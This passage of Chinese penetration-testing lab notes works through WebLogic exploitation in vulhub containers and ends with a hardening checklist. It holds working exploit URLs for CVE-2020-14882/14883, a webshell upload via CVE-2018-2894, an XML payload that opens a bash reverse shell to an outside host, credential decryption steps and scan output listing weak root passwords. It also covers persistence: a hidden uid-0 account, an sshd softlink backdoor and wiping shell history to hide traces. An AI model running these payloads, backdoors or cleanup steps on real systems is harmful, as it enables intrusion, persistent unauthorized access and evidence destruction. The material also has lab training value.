`exploit.py`执行完成后，执行`docker compose exec weblogic bash`进入容器中，可见/tmp/success已成功创建。

```
docker compose exec weblogic bash

cat /tmp/success
```

![image-20240725090719683](../../../../repo/assets/image-20240725090719683.png)

### Weblogic漏洞利用-CVE-2018-2894

#### 漏洞原理

WebLogic管理端未授权的两个页面存在**任意上传getshell漏洞**，攻击者可通过访问此配置页面，用有效的`WebLogic Web`路径替换存储`JKS Keystores`的文件目录，然后上传恶意的JSP脚本木马文件。两个页面分别为`/ws_utc/begin.do`，`/ws_utc/config.do`；`Web Service Test Page` 在 ‘**生产模式**’ 下默认不开启，所以该漏洞有一定限制。

#### 影响版本

10.3.6、12.1.3、12.2.4、12.2.1.3

#### 启动

```
cd /root/vulhub/weblogic/CVE-2018-2894
docker-compose up -d
docker ps -s
```

访问http://192.168.70.14:7001/console/login/LoginForm.jsp

##### 查看密码

```
docker-compose logs|grep password
```

![image-20240724165740980](../../../../repo/assets/image-20240724165740980.png)

> weblogic / UkpK5jbQ

![image-20240724170545894](../../../../repo/assets/image-20240724170545894.png)

#### **启用 Web 服务测试页**

base_domain -->高级 --> **启用 Web 服务测试页**

保存

![image-20240724171611052](../../../../repo/assets/image-20240724171611052.png)

访问http://192.168.70.14:7001/ws_utc/config.do

![image-20240724171818038](../../../../repo/assets/image-20240724171818038.png)

进入终端

```bash
docker exec -it cve-2018-2894_weblogic_1 /bin/bash
cd /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css
```

![image-20240724172412030](../../../../repo/assets/image-20240724172412030.png)

##### 替换工作目录

![image-20240724172555508](../../../../repo/assets/image-20240724172555508.png)

#### 上传冰蝎webshell

![image-20240724172915903](../../../../repo/assets/image-20240724172915903.png)

![image-20240724173053791](../../../../repo/assets/image-20240724173053791.png)

##### F12复制时间戳

![image-20240724173130489](../../../../repo/assets/image-20240724173130489.png)

> 1721813417933

访问http://192.168.70.14:7001/ws_utc/css/config/keystore/1721813417933_shell.jsp

![image-20240724173418872](../../../../repo/assets/image-20240724173418872.png)

#### 冰蝎连接

```
http://192.168.70.14:7001/ws_utc/css/config/keystore/1721813417933_shell.jsp
rebeyond
```

![image-20240724173737575](../../../../repo/assets/image-20240724173737575.png)

![image-20240724173801392](../../../../repo/assets/image-20240724173801392.png)

### Weblogic漏洞利用-CVE-2020-14882

#### 漏洞原理

`CVE-2020-14882` 允许远程用户**绕过管理员控制台**组件中的身份验证，`CVE-2020-14883` 允许经过身份验证的用户在管理员控制台组件上**执行任何命令**。使用这两个漏洞链，**未经身份验证**的远程攻击者可以通过 HTTP 在 Oracle WebLogic 服务器上执行任意命令并完全控制主机。

#### 影响版本

`10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0`

#### 利用方法：

第一种方法：`com.tangosol.coherence.mvel2.sh.ShellSession`

第二种方法：`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`

#### 启动

```bash
cd /root/vulhub/weblogic/CVE-2020-14882
docker-compose up -d
docker ps -s
```

![image-20240725100249470](../../../../repo/assets/image-20240725100249470.png)

访问http://192.168.70.14:7001/console/login/LoginForm.jsp

![image-20240725100403802](../../../../repo/assets/image-20240725100403802.png)

#### 权限绕过漏洞（CVE-2020-14882）

`Weblogic 12.2.1.3`

未授权访问：http://192.168.70.14:7001/console/css/%252e%252e%252fconsole.portal

两次url编码`../`

![image-20240725102955358](../../../../repo/assets/image-20240725102955358.png)

![image-20240725102359029](../../../../repo/assets/image-20240725102359029.png)

#### CVE-2020-14883

##### com.tangosol.coherence.mvel2.sh.ShellSession

###### 命令执行

```http
http://192.168.70.14:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")
```

![image-20240725103532148](../../../../repo/assets/image-20240725103532148.png)

###### 进入终端

```bash
docker exec -it cve-2020-14882_weblogic_1 /bin/bash
ls /tmp/success1
```

![image-20240725103722697](../../../../repo/assets/image-20240725103722697.png)

> 注意：这个利用方法只能在`Weblogic 12.2.1`以上版本利用，因为`10.3.6`并不存在`com.tangosol.coherence.mvel2.sh.ShellSession`类。

###### CVE-2020-14882_ALL

python脚本

```python
python CVE-2020-14882_ALL.py -h
python CVE-2020-14882_ALL.py -u 192.168.70.14:7001 -c "whoami"
```

![image-20240725165504636](../../../../repo/assets/image-20240725165504636.png)

##### com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext

构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上

`http://192.168.70.1/rce.xml`

```bash
python -m http.server 8000
```

![image-20240725105423056](../../../../repo/assets/image-20240725105423056.png)

```bash
nc -lvp 443
```

![image-20240725105734307](../../../../repo/assets/image-20240725105734307.png)

#### rce.xml

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[bash -i >& /dev/tcp/192.168.70.1/443 0>&1]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

![image-20240725163453391](../../../../repo/assets/image-20240725163453391.png)

#### 反弹shell

```bash
http://192.168.70.14:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.70.1:8000/rce.xml")
```

或者

```python
python CVE-2020-14882_ALL.py -u http://192.168.70.14:7001 -x http://192.168.70.1:8000/rce.xml
```

#### 反弹shell成功

![image-20240725164728256](../../../../repo/assets/image-20240725164728256.png)

##### ![image-20240725163606661](../../../../repo/assets/image-20240725163606661.png)执行命令：whoami

![image-20240725163857182](../../../../repo/assets/image-20240725163857182.png)

### Weblogic漏洞利用-CVE-2023-21839

#### 漏洞原理

WebLogic存在**远程代码执行漏洞**，该漏洞允许未经身份验证的远程攻击者通过T3/IIOP协议网络访问并破坏易受攻击的WebLogic服务器，成功利用此漏洞可能导致Oracle WebLogic服务器被接管或敏感信息泄露。漏洞原理其实是通过Weblogic t3/iiop协议支持远程绑定对象bind到服务端，当远程对象继承自OpaqueReference时，lookup查看远程对象时，服务端调用远程对象getReferent方法，其中的remoteJNDIName参数可控，导致攻击者可利用rmi/ldap远程协议进行远程命令执行。

#### 加固建议

使用连接筛选器临时阻止外部访问7001端口的T3/T3s协议

禁用IIOP协议。

升级weblogic版本，更新最新补丁。

#### 启动

```
cd /root/vulhub/weblogic/CVE-2023-21839
docker-compose up -d
docker ps -s
```



### WebLogic密码解密器

WebLogic密码解密器(WebLogic Password Decryptor)

#### 1.启动jar

```
java -jar WebLogicPasswordDecryptor.jar
```

![image-20240725111104330](../../../../repo/assets/image-20240725111104330.png)

#### 2.下载DAT文件

```bash
cd /opt/weblogic/Oracle/Middleware/user_projects/domains/base_domain/security
ls SerializedSystemIni.dat
```

![image-20240725111852196](../../../../repo/assets/image-20240725111852196.png)

#### 3.下载密文

```bash
cd /opt/weblogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security
cat boot.properties

# Generated by Configuration Wizard on Sat Jul 20 11:08:19 CST 2024
username={AES}o2LKNJjued2RPOMVIDZd42uMQUNs2yxpp/eQd0fewxM=
password={AES}uxeJsrSvqd4Smr+AzoAs55DwTLiKHw0L64SstaahcKs=
```

![image-20240725111408237](../../../../repo/assets/image-20240725111408237.png)

![image-20240725111759496](../../../../repo/assets/image-20240725111759496.png)

#### 4.开始解密

##### 1.解密用户名

![image-20240725112413350](../../../../repo/assets/image-20240725112413350.png)

##### 2.解密密码

![image-20240725112439873](../../../../repo/assets/image-20240725112439873.png)

### Fscan

#### 开始扫描

```
chmod +x fscan
./fscan -h 192.168.3.1/24
```

#### 扫描结果

```
[+] mysql 192.168.3.244:3306:root 123456
[+] mysql 192.168.3.6:3306:root 123456
[+] mysql 192.168.3.24:3306:root 123456
[+] mysql 192.168.3.43:3306:root root
[+] mysql 192.168.3.81:3306:root root

[+] SSH 192.168.3.63:22:root 123456
x[+] SSH 192.168.3.60:22:root 123456
[+] SSH 192.168.3.71:22:root 123456
[+] SSH 192.168.3.78:22:root 123456
[+] SSH 192.168.3.85:22:root 123456
[+] SSH 192.168.3.52:22:root 123456
```

#### 持久化

##### 添加特权账户和PAM软链接

```
useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test
ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oPort=23333 
echo >.bash_history
echo >/var/spool/mail/root

ssh root@192.168.3.52 -p 23333
ssh root@192.168.3.60 -p 23333
ssh root@192.168.3.63 -p 23333
ssh root@192.168.3.71 -p 23333
ssh root@192.168.3.78 -p 23333
ssh root@192.168.3.85 -p 23333

ssh guest@192.168.3.85
123456
```

#### 痕迹清除

```
echo >.bash_history
```



### Weblogic基线检查

#### 启动Weblogic

```
bash /opt/weblogic/Oracle/Middleware/user_projects/domains/base_domain/startWebLogic.sh
```

http://192.168.70.14:7001/console/login/LoginForm.jsp

> weblogic / wasjweblogic123

#### 重启

```bash
bash /opt/weblogic/Oracle/Middleware/user_projects/domains/base_domain/bin/stopWebLogic.sh
bash /opt/weblogic/Oracle/Middleware/user_projects/domains/base_domain/bin/startWebLogic.sh
```

#### **设备管理**

##### 管理控制台

测评项目：管理控制台

预期效果：控制台console重命名，禁止默认访问

检查方式：domain-高级-控制台上下文路径

![image-20240725154608079](../../../../repo/assets/image-20240725154608079.png)

加固方式：不适用默认的console，更换为其他名称

![image-20240725154645721](../../../../repo/assets/image-20240725154645721.png)

#### **用户账号与口令安全**

##### 口令策略

测评项目：口令策略

预期效果：Weblogic的登录密码长度不能小于8位

检查方式：安全领域 ——myrealm ——提供程序 ——DefaultAuthenticator ——配置 ——提供程序待定 —— 最小口令长度

![image-20240725154739093](../../../../repo/assets/image-20240725154739093.png)

![image-20240725154815563](../../../../repo/assets/image-20240725154815563.png)

加固方式：修改登录密码长度不能少于8位

##### 账号策略

测评项目：账号策略

预期效果：封锁阈值5次、封锁持续时间30分钟、封锁重置持续时间5分钟

检查方式：安全领域 —— myrealm —— 配置 —— 用户封锁

![image-20240725155038957](../../../../repo/assets/image-20240725155038957.png)

加固方式：设置密码输入错误5次后，封锁该账号30分钟，封锁重置持续时间5分钟



#### **日志与审计**

##### Weblogic日志记录

测评项目：Weblogic日志记录

预期效果：定义日志名称及存储位置，记录相关日志，滚动文件大小为500

检查方式：Domain —— 配置 —— 日志记录

![image-20240725155229364](../../../../repo/assets/image-20240725155229364.png)

加固方式：设置日志存储的位置，滚动文件大小为500

##### HTTP日志

测评项目：HTTP日志

预期效果：定义日志名称及存储位置，记录相关日志，滚动文件大小为500

检查方式：Domain——监视 —— AdminServer —— 日志记录 —— HTTP

![image-20240725155319125](../../../../repo/assets/image-20240725155319125.png)

加固方式：设置日志存储的位置，滚动文件大小为500

#### **安全防护**

##### 连接会话超时控制

测评项目：连接会话超时控制

预期效果：控制台连接超时时间为300秒

检查方式：Domain —— 配置 —— 一般信息 —— 高级 —— 控制台会话超时

![image-20240725155421964](../../../../repo/assets/image-20240725155421964.png)

加固方式：控制台超时时间为300秒

![image-20240725160058040](../../../../repo/assets/image-20240725160058040.png)

##### 数据传输安全

测评项目：数据传输安全

预期效果：启用SSL监听（默认端口为7002），并修改为非7002端口

检查方式：Domain —— 服务器 ——AdminServer —— 配置 —— 一般信息 —— 启用SSL监听端口

![image-20240725160709863](../../../../repo/assets/image-20240725160709863.png)

加固方式：修改SSL默认监听端口——密钥库中导入SSL——在SSL服务中选定导入

![image-20240725160732914](../../../../repo/assets/image-20240725160732914.png)

##### SSL保护

测评项目：SSL保护

预期效果：启用主机名校验，通过禁用”Hostname Verification Ignored”保护SSL中间人攻击

检查方式：domain —— 服务器 ——AdminServer —— 配置 —— SSL —— 高级 —— 主机名验证

![image-20240725161003485](../../../../repo/assets/image-20240725161003485.png)

加固方式：启用主机名验证

##### Banner信息

测评项目：Banner信息

预期效果：禁止发送服务标识，通过禁用配置文件“Send Server Header”，防止信息泄漏

检查方式：domain —— 服务器 —— AdminServer —— 协议 —— HTTP —— 发送服务器标头不勾选

![image-20240725161115460](../../../../repo/assets/image-20240725161115460.png)

加固方式：发送服务器头不勾选